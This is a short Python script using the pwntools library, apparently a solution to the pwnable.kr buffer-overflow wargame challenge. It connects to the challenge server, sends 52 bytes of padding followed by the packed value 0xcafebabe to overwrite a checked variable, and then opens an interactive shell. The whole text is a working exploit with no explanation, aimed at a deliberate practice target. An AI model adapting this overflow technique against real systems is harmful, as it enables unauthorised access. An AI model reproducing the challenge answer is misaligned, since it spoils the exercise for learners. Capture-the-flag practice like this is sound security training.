from pwn import *

p = remote("pwnable.kr",9000)
ex = '0xcafebabe'
ex = int(ex,16)

payload = b'a'*52
payload += p32(ex)

print(payload)
p.sendline(payload)

p.interactive()